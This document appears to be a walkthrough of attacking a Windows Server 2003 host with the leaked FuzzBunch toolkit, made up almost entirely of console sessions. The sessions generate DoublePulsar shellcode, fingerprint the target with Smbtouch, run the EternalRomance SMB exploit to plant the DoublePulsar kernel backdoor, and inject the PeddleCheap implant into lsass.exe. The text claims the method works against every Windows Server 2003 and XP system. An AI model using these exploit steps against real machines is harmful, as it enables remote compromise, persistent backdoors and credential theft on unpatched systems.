Can be used to exploit every Windows Server 2003 and XP. <br>
EternalRomance  using Shellcode generated by DoublePulsar and then inject PeddleCheap. 

```shell
fb > use Doublepulsar

[!] Entering Plugin Context :: Doublepulsar
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 192.168.146.134

[*] Applying Session Parameters

[!] Enter Prompt Mode :: Doublepulsar

Module: Doublepulsar
====================

Name              Value
----              -----
NetworkTimeout    60
TargetIp          192.168.146.134
TargetPort        445
OutputFile
Protocol          SMB
Architecture      x86
Function          OutputInstall

[!] Plugin Variables are NOT Valid
[?] Prompt For Variable Settings? [Yes] :

[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1
for no timeout.

[?] NetworkTimeout [60] :

[*]  TargetIp :: Target IP Address

[?] TargetIp [192.168.146.134] :

[*]  TargetPort :: Port used by the Double Pulsar back door

[?] TargetPort [445] :

[*]  Protocol :: Protocol for the backdoor to speak

   *0) SMB     Ring 0 SMB (TCP 445) backdoor
    1) RDP     Ring 0 RDP (TCP 3389) backdoor

[?] Protocol [0] :

[*]  Architecture :: Architecture of the target OS

   *0) x86     x86 32-bits
    1) x64     x64 64-bits

[?] Architecture [0] :

[*]  Function :: Operation for backdoor to perform

   *0) OutputInstall     Only output the install shellcode to a binary file on d
isk.
    1) Ping              Test for presence of backdoor
    2) RunDLL            Use an APC to inject a DLL into a user mode process.
    3) RunShellcode      Run raw shellcode
    4) Uninstall         Remove's backdoor from system

[?] Function [0] :

[*]  OutputFile :: Full path to the output file

[?] OutputFile [] : C:\Users\Urahara\shellcode.bin
[+] Set OutputFile => C:\Users\Urahara\shellcode.bin

[!] Preparing to Execute Doublepulsar
[*] Redirection OFF

[+] Configure Plugin Local Tunnels
[+] Local Tunnel - local-tunnel-1
[?] Destination IP [192.168.146.134] :
[?] Destination Port [445] :
[+] (TCP) Local 192.168.146.134:445

[+] Configure Plugin Remote Tunnels


Module: Doublepulsar
====================

Name              Value
----              -----
NetworkTimeout    60
TargetIp          192.168.146.134
TargetPort        445
OutputFile        C:\Users\Urahara\shellcode.bin
Protocol          SMB
Architecture      x86
Function          OutputInstall

[?] Execute Plugin? [Yes] :
[*] Executing Plugin
[+] Selected Protocol SMB
[+] Writing Installer to disk
[*] Deleting old version of OutputFile if it exists
[*] Shellcode written to OutputFile
[+] Doublepulsar Succeeded
```

```shell
fb Exploit (Eternalromance) > use Eternalromance

[!] Entering Plugin Context :: Eternalromance
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 192.168.146.134

[*] Applying Session Parameters
[*] Running Exploit Touches

[!] Entering Plugin Context :: Smbtouch
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 192.168.146.134

[*] Inheriting Input Variables

[!] Enter Prompt Mode :: Smbtouch

[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1
for no timeout.

[?] NetworkTimeout [60] :

[*]  TargetIp :: Target IP Address

[?] TargetIp [192.168.146.134] :

[*]  TargetPort :: Port used by the SMB service

[?] TargetPort [445] :

[*]  Pipe :: Test an additional pipe to see if it is accessible (optional)

[?] Pipe [] :

[*]  Share :: Test a file share to see if it is accessible (optional), entered as hex bytes (in unicode)

[?] Share [] :

[*]  Protocol :: SMB (default port 445) or NBT (default port 139)

   *0) SMB
    1) NBT

[?] Protocol [0] :

[*]  Credentials :: Type of credentials to use

   *0) Anonymous     Anonymous (NULL session)
    1) Guest         Guest account
    2) Blank         User account with no password set
    3) Password      User name and password
    4) NTLM          User name and NTLM hash

[?] Credentials [0] :


[!] Preparing to Execute Smbtouch
[*] Redirection OFF

[+] Configure Plugin Local Tunnels

[+] Configure Plugin Remote Tunnels


Module: Smbtouch
================

Name                    Value
----                    -----
NetworkTimeout          60
TargetIp                192.168.146.134
TargetPort              445
RedirectedTargetIp
RedirectedTargetPort
UsingNbt                False
Pipe
Share
Protocol                SMB
Credentials             Anonymous

[?] Execute Plugin? [Yes] :
[*] Executing Plugin
[+] SMB Touch started

[*] TargetIp              192.168.146.134
[*] TargetPort            445
[*] RedirectedTargetIp    (null)
[*] RedirectedTargetPort  0
[*] NetworkTimeout        60
[*] Protocol              SMB
[*] Credentials           Anonymous

[*] Connecting to target...
        [+] Initiated SMB connection

[+] Target OS Version 5.2 build 3790
    Windows Server 2003 3790 Service Pack 2

[*] Trying pipes...
        [-] spoolss    - Not accessible (0xC0000034 - NtErrorObjectNameNotFound)

        [+] browser    - Success!

[*] Using Remote API to determine architecture
        [+] Target is 32-bit

[Not Supported]
        ETERNALBLUE     - Target OS version not supported
        ETERNALSYNERGY  - Target OS version not supported

[Vulnerable]
        ETERNALROMANCE  - FB
        ETERNALCHAMPION - DANE/FB

[*] Writing output parameters

[+] Target is vulnerable to 2 exploits
[+] Touch completed successfully

[+] Smbtouch Succeeded

[*] Exporting Contract To Exploit
[+] Set PipeName => browser
[+] Set Credentials => Anonymous
[+] Set Target => SERVER_2003_SP2


[!] Enter Prompt Mode :: Eternalromance

Module: Eternalromance
======================

Name              Value
----              -----
NetworkTimeout    60
TargetIp          192.168.146.134
TargetPort        445
PipeName          browser
ShellcodeFile     C:\Users\Urahara\shellcode.bin
ExploitMethod     Default
Credentials       Anonymous
Protocol          SMB
Target            SERVER_2003_SP2

[!] plugin variables are valid
[?] Prompt For Variable Settings? [Yes] :

[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1
for no timeout.

[?] NetworkTimeout [60] :

[*]  TargetIp :: Target IP Address

[?] TargetIp [192.168.146.134] :

[*]  TargetPort :: Target TCP port

[?] TargetPort [445] :

[*]  PipeName :: The named pipe to use

[?] PipeName [browser] :

[*]  ShellcodeFile :: DOPU (ensure correct architecture) ONLY! Other shellcode will likely BSOD.

[?] ShellcodeFile [] :C:\Users\Urahara\shellcode.bin

[*]  ExploitMethod :: Which exploit method to use

   *0) Default              Use the best exploit method(s) for the target OS
    1) Fish-in-a-barrel     Most reliable exploit method (XP/2k3 only)
    2) Matched-pairs        Next reliable exploit method (XP/Win7/2k8R2 only)
    3) Classic-Romance      Original LargePageGroom exploit method (All OS Versi
ons)

[?] ExploitMethod [0] :

[*]  Credentials :: Type of credentials to use

   *0) Anonymous     Anonymous (NULL session)
    1) Guest         Guest account
    2) Blank         User account with no password set
    3) Password      User name and password
    4) NTLM          User name and NTLM hash

[?] Credentials [0] :

[*]  Protocol :: SMB (default port 445) or NBT (default port 139)

   *0) SMB
    1) NBT

[?] Protocol [0] :

[*]  Target :: Operating System, Service Pack, of target OS

    0) XP_SP0SP1_X86         Windows XP Sp0 and Sp1, 32-bit
    1) XP_SP2SP3_X86         Windows XP Sp2 and Sp3, 32-bit
    2) XP_SP1_X64            Windows XP Sp1, 64-bit
    3) XP_SP2_X64            Windows XP Sp2, 64-bit
    4) SERVER_2003_SP0       Windows Sever 2003 Sp0, 32-bit
    5) SERVER_2003_SP1       Windows Sever 2003 Sp1, 32-bit/64-bit
   *6) SERVER_2003_SP2       Windows Sever 2003 Sp2, 32-bit/64-bit
    7) VISTA_SP0             Windows Vista Sp0, 32-bit/64-bit
    8) VISTA_SP1             Windows Vista Sp1, 32-bit/64-bit
    9) VISTA_SP2             Windows Vista Sp2, 32-bit/64-bit
    10) SERVER_2008_SP0       Windows Server 2008 Sp0, 32-bit/64-bit
    11) SERVER_2008_SP1       Windows Server 2008 Sp1, 32-bit/64-bit
    12) SERVER_2008_SP2       Windows Server 2008 Sp2, 32-bit/64-bit
    13) WIN7_SP0              Windows 7 Sp0, 32-bit/64-bit
    14) WIN7_SP1              Windows 7 Sp1, 32-bit/64-bit
    15) SERVER_2008R2_SP0     Windows Server 2008 R2 Sp0, 32-bit/64-bit
    16) SERVER_2008R2_SP1     Windows Server 2008 R2 Sp1, 32-bit/64-bit

[?] Target [6] :

[!] Preparing to Execute Eternalromance
[*] Redirection OFF

[+] Configure Plugin Local Tunnels
[+] Local Tunnel - local-tunnel-1
[?] Destination IP [192.168.146.134] :
[?] Destination Port [445] :
[+] (TCP) Local 192.168.146.134:445

[+] Configure Plugin Remote Tunnels


Module: Eternalromance
======================

Name                   Value
----                   -----
NetworkTimeout         60
TargetIp               192.168.146.134
TargetPort             445
MaxExploitAttempts     3
PipeName               browser
ExploitMethodChoice    0
ShellcodeFile          C:\Users\Urahara\shellcode.bin
CredChoice             0
Username
Password
UsingNbt               False
OsMajor                5
OsMinor                2
OsServicePack          2
ExploitMethod          Default
Credentials            Anonymous
Protocol               SMB
Target                 SERVER_2003_SP2

[?] Execute Plugin? [Yes] :
[*] Executing Plugin
[*] Running Exploit
[*] Initializing Parameters
        [+] Target 192.168.146.134:445
        [+] Authcode: 0x3d783118
        [+] XorMask: 0xad
        [+] Network Timeout: 60 seconds
[*] Attempting exploit method 1
[*] Initializing Network
        [+] Initial smb session setup completed
[*] Trying pipe browser...
        [+] Success!
        [+] Smb pipe and rpc setup complete
[*] Filling barrel with fish... done

<----------------| Entering Danger Zone |----------------->

        [*] Preparing dynamite...
                [*] Trying stick 1 (x64)...Miss
                [*] Trying stick 1 (x86)...BOOM!
        [+] Successfully Leaked Transaction!
        [+] Successfully caught Fish-in-a-barrel

<----------------| Leaving Danger Zone |----------------->

[*] Attempting to find remote SRV module
        [+] Reading from CONNECTION struct at: 0x85A84958
        [+] Found SRV global data pointer: 0xBAA33FAC
                [+] Locating function tables...
                        [+] Transaction2Dispatch Table at: 0xBAA33638
[*] Installing DOUBLEPULSAR
        [+] Leaked Npp Buffer to Execute at: 0x858EDE98
        [+] shellcodeaddress = 858edf98, shellcodefilesize=3655
        [+] Backdoor shellcode written
        [+] Backdoor function pointer overwritten
[*] Executing DOUBLEPULSAR
[*] DOUBLEPULSAR should now be installed. The DOPU client can be used to verify
installation.
[*] Plugin completed successfully
        [+] Contract: StagedUpload
        [+] ConnectedTcp: ffffffff
        [+] XorMask: ad
        [+] TargetOsArchitecture: x86
[+] Eternalromance Succeeded
```

```
[!] Entering Plugin Context :: Doublepulsar
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 192.168.146.134

[*] Applying Session Parameters
[-] Error: Invalid value for Function ()
[-] Skipping 'Function'

[!] Enter Prompt Mode :: Doublepulsar

Module: Doublepulsar
====================

Name              Value
----              -----
NetworkTimeout    60
TargetIp          192.168.146.134
TargetPort        445
OutputFile        C:\Users\Urahara\shellcode.bin
Protocol          SMB
Architecture      x86
Function          OutputInstall

[!] plugin variables are valid
[?] Prompt For Variable Settings? [Yes] :

[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1
for no timeout.

[?] NetworkTimeout [60] :

[*]  TargetIp :: Target IP Address

[?] TargetIp [192.168.146.134] :

[*]  TargetPort :: Port used by the Double Pulsar back door

[?] TargetPort [445] :

[*]  Protocol :: Protocol for the backdoor to speak

   *0) SMB     Ring 0 SMB (TCP 445) backdoor
    1) RDP     Ring 0 RDP (TCP 3389) backdoor

[?] Protocol [0] :

[*]  Architecture :: Architecture of the target OS

   *0) x86     x86 32-bits
    1) x64     x64 64-bits

[?] Architecture [0] :

[*]  Function :: Operation for backdoor to perform

   *0) OutputInstall     Only output the install shellcode to a binary file on d
isk.
    1) Ping              Test for presence of backdoor
    2) RunDLL            Use an APC to inject a DLL into a user mode process.
    3) RunShellcode      Run raw shellcode
    4) Uninstall         Remove's backdoor from system

[?] Function [0] : 2
[+] Set Function => RunDLL

[*]  DllPayload :: DLL to inject into user mode

[?] DllPayload [] : C:\Logs\wahaha\z0.0.0.1/Payloads/PeddleCheap_2017_04_30_18h5
8m25s.361/PC_Level3_exe.configured
[+] Set DllPayload => C:\Logs\wahaha\z0.0.0.1/Payloads/PeddleCheap_2017_... (plu
s 44 characters)

[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call


[?] DllOrdinal [1] :

[*]  ProcessName :: Name of process to inject into

[?] ProcessName [lsass.exe] :

[*]  ProcessCommandLine :: Command line of process to inject into

[?] ProcessCommandLine [] :


[!] Preparing to Execute Doublepulsar
[*] Redirection OFF

[+] Configure Plugin Local Tunnels
[+] Local Tunnel - local-tunnel-1
[?] Destination IP [192.168.146.134] :
[?] Destination Port [445] :
[+] (TCP) Local 192.168.146.134:445

[+] Configure Plugin Remote Tunnels


Module: Doublepulsar
====================

Name                  Value
----                  -----
NetworkTimeout        60
TargetIp              192.168.146.134
TargetPort            445
DllPayload            C:\Logs\wahaha\z0.0.0.1\Payloads\PeddleCheap_2017_
                      04_30_18h58m25s.361\PC_Level3_exe.configured
DllOrdinal            1
ProcessName           lsass.exe
ProcessCommandLine
Protocol              SMB
Architecture          x86
Function              RunDLL

[?] Execute Plugin? [Yes] :
[*] Executing Plugin
[+] Selected Protocol SMB
[.] Connecting to target...
[+] Connected to target, pinging backdoor...
        [+] Backdoor returned code: 10 - Success!
        [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x6516AC8
B
    SMB Connection string is: Windows Server 2003 3790 Service Pack 2
    Target OS is: 2003 x86
    Target SP is: 2
        [+] Backdoor installed
        [+] DLL built
        [.] Sending shellcode to inject DLL
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Backdoor returned code: 10 - Success!
        [+] Command completed successfully
[+] Doublepulsar Succeeded
```